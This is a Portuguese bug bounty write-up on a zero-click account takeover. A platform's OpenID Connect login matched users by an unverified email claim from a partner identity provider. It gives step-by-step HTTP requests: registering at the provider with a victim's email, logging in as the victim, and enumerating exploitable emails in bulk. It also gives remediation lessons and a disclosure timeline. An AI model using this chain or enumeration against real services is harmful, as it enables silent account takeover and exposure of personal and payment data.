---
title: 'Zero-Click Account Takeover: Roubando Contas de Usuários Através de Login Alternativo (IdP Confusion)'
summary: 'Uma falha de verificação de e-mail na integração de SSO (OpenID Connect) entre uma plataforma educacional e o IdP de uma editora permitia o takeover completo de qualquer conta, sem senha, sem token e sem nenhuma interação da vítima.'
pubDate: 2026-09-21
tags: ['Bug Bounty', 'Web', 'SSO', 'OAuth', 'Account Takeover']
platform: 'Bug Bounty'
severity: 'Critical'
reward: '€700'
cover: '../../../assets/writeups/002/idp-confusion-cover.jpg'
coverAlt: 'Diagrama do fluxo de IdP Confusion levando a account takeover'
draft: false
---

Fala, hackers!

Neste write-up vou mostrar como uma falha de verificação de e-mail na integração de SSO (OpenID Connect) entre uma plataforma de dicionário e conteúdo educacional online e o provedor de identidade federado usado por ela, uma grande editora de material didático, permitia o takeover completo de qualquer conta cujo e-mail o atacante conhecesse. Sem senha da vítima, sem token roubado, sem nenhuma interação dela. Zero clique, zero notificação, zero rastro.

## Um belo dia

Eu estava dando uma olhada em alguns programas privados de bug bounty e reparei em um que, desde que recebi o convite, eu nunca tinha reportado nada. Só que esse mesmo programa já tinha mais de 100 mil euros pagos em bugs de outros pesquisadores. Olhei esse número e pensei: se está pagando isso tudo, tem alvos bom ali, só falta eu (e meu hackbot) darmos a atenção devida.

Fui analisar os assets em escopo e encontrei uma subsidiária com fluxos bem interessantes. Inclusive, meu hackbot já tinha encontrado algumas coisas por ali antes, o que reforçou a impressão de que aquele era um alvo interessante. Decidi então focar no básico (o que eu mais gosto): analisar o fluxo de login e registro dessa subsidiária.

Logo na tela de login, antes mesmo de tentar qualquer coisa mais elaborada, reparei num botão que sempre me chama atenção quando estou num alvo: "Entrar com Serviço X". A plataforma em questão era um serviço de dicionário e conteúdo educacional online, e o botão apontava pra um provedor de identidade federado (IdP) que pertencia à própria editora, dona do programa. Ou seja, ali não era só mais uma opção de conveniência para o usuário: era um ponto de confiança entre duas aplicações diferentes, e pontos assim raramente recebem o mesmo nível de atenção que o fluxo de login principal. Então, vamos lá.

## O login alternativo

Toda plataforma que oferece "Entrar com Serviço X" me chama atenção, porque esse tipo de integração costuma esconder premissas que ninguém valida ou revalida em produção. Nesse caso, a plataforma oferecia login via um provedor de identidade federado (IdP) pertencente à editora parceira dela. Em vez de criar conta e senha próprias, o usuário autenticava lá e voltava já logado.

Então acompanhei o fluxo feliz, sem esperar nada ainda:

```
GET /user/authenticate/redacted-idp HTTP/2
Host: www.redacted.com
Accept: text/html
```

```
HTTP/2 302 Found
Location: https://id.redacted-idp.com/oxauth/restv1/authorize?client_id=CLIENT_ID_REDACTED&scope=openid%20email%20profile&redirect_uri=https%3A%2F%2Fwww.redacted.com%2Fopenid-connect%2Fredacted-idp
```

Login no IdP, um clique, e o navegador volta para `www.redacted.com/redacted-idp-login-redirect#id_token=<token>` já autenticado na plataforma. Até aqui, nada de errado, é assim que OIDC deveria funcionar mesmo. Mas duas coisas me chamaram atenção: nenhuma tela de consentimento e nenhuma etapa de "vincular esta conta?" antes de cair autenticado. Isso não é necessariamente uma falha, mas é o tipo de detalhe que me faz querer abrir o token, entender a integração e ver exatamente o que está sendo passado entre os ambientes.

## Analisando o token

Decodifiquei o `id_token` emitido pelo IdP (`id.redacted-idp.com`) pra esse client:

```json
{
  "iss": "https://id.redacted-idp.com",
  "sub": "a1b2c3d4-0000-1111-2222-333344445555",
  "name": "Usuário",
  "email": "usuario@gmail.com"
}
```

Reparem que não há: nenhum campo `email_verified`. E ok, é perfeitamente possível que a aplicação nem use esse claim, ou que o IdP garanta a verificação em algum outro momento do fluxo. Mas levanta a pergunta: se esse campo não existe, a plataforma tem como saber se aquele e-mail foi de fato comprovado antes de decidir em qual conta local te autenticar?

Testei o comportamento na prática: testei novamente o fluxo, mas de um jeito que isolasse essa variável do e-mail verificado: cadastrando um e-mail que eu controlava e sabia não pertencer a nenhuma conta local ainda, versus um e-mail que eu sabia pertencer a uma conta já existente na plataforma (via cadastro nativo). O resultado confirmou a suspeita: a plataforma resolve a conta local só pelo valor do e-mail vindo do token. Se encontra um match, autentica ali dentro, sem checar mais nada.

Ou seja, a decisão de "essa pessoa é dona dessa conta" está inteiramente delegada ao valor de um campo de texto que o próprio IdP me deixa preencher. E isso só vira um problema real se eu conseguir fazer o IdP emitir um `id_token` com o e-mail de outra pessoa. Ok, vamos tentar explorar isso.

## Entendendo o fluxo de login alternativo

Se a plataforma confia cegamente no e-mail que o IdP entrega, a pergunta seguinte é óbvia: o cadastro do IdP garante que esse e-mail pertence mesmo a quem está se cadastrando?

Criei uma conta de teste no fluxo de sign-up do IdP e prestei atenção em cada resposta da API:

```
POST /v1/registration/teacher/login-credentials HTTP/2
Host: api.redacted-idp.com
Content-Type: application/json

{"email":"usuario@gmail.com","password":"SenhaForte123!","userName":"usuario"}
```

```
HTTP/2 200 OK
Content-Type: application/json

{"successType":"NEW_TEACHER"}
```

Sem cookie, sem CSRF token, sem CAPTCHA. Uma chamada anônima já cria as credenciais. Segui o fluxo até o fim:

### Validação de Endereço

```
POST /v1/address/validation HTTP/2
Host: api.redacted-idp.com
Content-Type: application/json

{"city":"São Paulo","countryId":"BR","street":"Rua das Flores","streetNumber":"123","zipCode":"01000-000"}
```

```
HTTP/2 200 OK

{"validationResult":"VALID","suggestion":null}
```

### Validação de Professor

```
POST /v1/registration/teacher HTTP/2
Host: api.redacted-idp.com
Content-Type: application/json

{"salutation":"SR","city":"XIQUE XIQUE","countryId":"BR","email":"usuario@example.com",
 "firstName":"Usuário","lastName":"da Silva","password":"SenhaForte123!",
 "street":"Rua Six da Seven","streetNumber":"67","userName":"usuario","zipCode":"01234-000"}
```

```
HTTP/2 200 OK

{"successType":"NEW_TEACHER","accountNumber":"9988646769"}
```

E aqui veio a confirmação que eu estava procurando: a conta já autenticava normalmente no IdP antes mesmo de eu abrir a caixa de entrada. O e-mail de "confirmação" que chegou não tinha link de ativação nenhum, só nome de usuário e links de marketing. Nada bloqueava o login até que eu clicasse em algo.

Nesse momento as duas peças se encaixaram: o IdP emite identidade completa sem provar posse do e-mail, e a plataforma consome essa identidade confiando cegamente no e-mail recebido. Isoladamente, cada comportamento é discutível. Juntos, formam uma chain completa de account takeover: bastava eu me cadastrar no IdP usando o e-mail de qualquer pessoa, e a plataforma me autenticaria como essa pessoa.

## Comparando com o fluxo feliz da plataforma

Antes de montar o PoC final, quis confirmar uma coisa: será que esse era um risco aceito conscientemente, ou simplesmente um controle que existia em outro lugar e não foi replicado aqui? Então, fui verificar o cadastro nativo da própria plataforma, sem passar pelo IdP:

```
POST /api/v1/users HTTP/2
Host: www.redacted.com
Content-Type: application/json

{"email":"usuario2@gmail.com","givenName":"Usuário","familyName":" Vítima","pass":"SenhaForte123!","source":"redacted"}
```

```
HTTP/2 200 OK
Content-Type: application/json

{"status":true}
```

E, de fato: a plataforma dispara um e-mail com um link único de verificação (`/user/register/verification/{hash}`), que precisa ser acessado antes de a conta funcionar. Ou seja, o controle de comprovação de posse do e-mail já existe no produto, só que foi implementado exclusivamente no cadastro nativo, e nunca replicado no caminho do SSO. Não era uma decisão de arquitetura. Era um gap num caminho alternativo pro mesmo destino.

Com a lacuna confirmada dos dois lados, faltava só a prova de impacto ponta a ponta.

## Montando o ataque

O pré-requisito é simples: a vítima ter uma conta registrada e confirmada na plataforma (via cadastro nativo), com um e-mail que o atacante conhece. Algo bem plausível considerando vazamentos de terceiros, assinaturas de e-mail corporativo ou padrões previsíveis de e-mail institucional.

Usei a conta "vítima" de teste criada no passo anterior como alvo. Antes de tentar o cadastro no IdP com o e-mail dela, vale notar que essa mesma chamada de `login-credentials` que usei pra investigar o comportamento também serve como alternativa de enumeração: `NEW_TEACHER` confirma que o e-mail ainda não foi reivindicado no IdP, ou seja, alvo atacável; `{"errorCode":"EMAIL_ALREADY_EXISTS"}` descarta o alvo. Isso permite varrer uma lista inteira de e-mails vazados e saber exatamente quais contas são exploráveis, sem nunca gerar log nenhum na plataforma alvo.

Confirmado o alvo como viável, repeti o cadastro completo no IdP usando o e-mail da vítima e um nome fictício meu:

```
POST /v1/registration/teacher HTTP/2
Host: api.redacted-idp.com
Content-Type: application/json

{"salutation":"SR","city":"Xique Xique","countryId":"BR","email":"usuario2@gmail.com",
 "firstName":"Luq","lastName":"ATO PoC","password":"OutraSenha456!",
 "street":"Rua Six Seven da Silva","streetNumber":"123","userName":"luq-ato","zipCode":"01000-000"}
```

```
HTTP/2 200 OK

{"successType":"NEW_TEACHER","accountNumber":"1122334455"}
```

Fiz login no IdP com essa conta recém-criada e, na mesma sessão de browser, voltei pra "porta lateral" da plataforma:

```
GET /user/authenticate/redacted-idp HTTP/2
Host: www.redacted.com
Accept: text/html
Cookie: SESSAO_IDP_ATACANTE=eyJhbGciOi...
```

O fluxo OIDC roda normal, volta pro redirect com `id_token`, e cai autenticado em `/user`. O token decodifica pra:

```json
{
  "iss": "https://id.redacted-idp.com",
  "sub": "f6e5d4c3-9999-8888-7777-666655554444",
  "name": "Luq ATO PoC",
  "email": "usuario2@gmail.com"
}
```

O `name` é o que eu, atacante, cadastrei. `email` é da vítima, e é só nesse campo que a plataforma confia pra decidir em qual conta autenticar. A prova de impacto veio ao ler o próprio perfil da sessão recém-aberta:

```
GET /api/v1/users/current HTTP/2
Host: www.redacted.com
Application-Authorization: Bearer ATTACKER_TOKEN_EXAMPLE
X-Token-Provider: redacted-idp
Accept: application/json
```

Esperava receber a conta nova, com o nome fictício que tinha acabado de cadastrar. Recebi isto:

```
HTTP/2 200 OK
Content-Type: application/json

{
  "id": "scim-victim-000111222",
  "name": {"familyName":"Vitima","givenName":"Usuário"},
  "displayName": "Usuário Vitima",
  "userEmail": "usuario2@gmail.com",
  "roles": ["authenticated","redacted_basic"]
}
```

A sessão caiu direto na conta da vítima, criada antes de a minha identidade sequer existir no IdP. O nome retornado nunca foi informado por mim.

## Resultado

Com a sessão autenticada como a vítima, o acesso alcançava:

- Leitura de nome completo, e-mail, UID interno, SCIM ID e roles da conta;
- Escrita no perfil da vítima via `PATCH /api/v1/users/current`, com o servidor confirmando o UID dela na resposta;
- As seções de alterar senha, excluir conta, dados de pagamento e faturas, incluindo os endpoints internos de clientes e contratos;
- Seleção prévia de alvos em massa, de forma totalmente anônima, via `NEW_TEACHER` vs `EMAIL_ALREADY_EXISTS`;
- E o detalhe mais incômodo: a vítima não recebe notificação nenhuma, não perde acesso, continua logando normalmente com a própria senha dela. Não existe rastro de que a conta foi acessada.

Pra qualquer assinante pago dessa plataforma cujo e-mail vazou em algum breach de terceiro, foi publicado numa assinatura de e-mail corporativo, ou simplesmente segue o padrão previsível `nome.sobrenome@empresa.com`, a conta estava a três requests HTTP anônimas de distância de ser tomada.

## Lições aprendidas

1. **Federação de identidade não é "confiar e pronto".** Cada lado da ponte (IdP e Service Provider) precisa reforçar a verificação de posse do identificador de junção, nesse caso o e-mail. Basta um dos dois pular essa etapa pra virar ATO.

2. **Compare o fluxo "oficial" com o fluxo "alternativo".** A plataforma já tinha o controle certo no cadastro nativo. A pergunta que vale sempre fazer é se esse mesmo controle existe em todos os caminhos que levam ao mesmo lugar.

## Timeline

- Reportado: `15/09/2026`
- Triado: `17/09/2026`
- Corrigido/Confirmado: `18/09/2026`
- Severidade: Crítica

Keep Hacking!

![Bounty](../../../assets/writeups/002/bounty-proof.png)
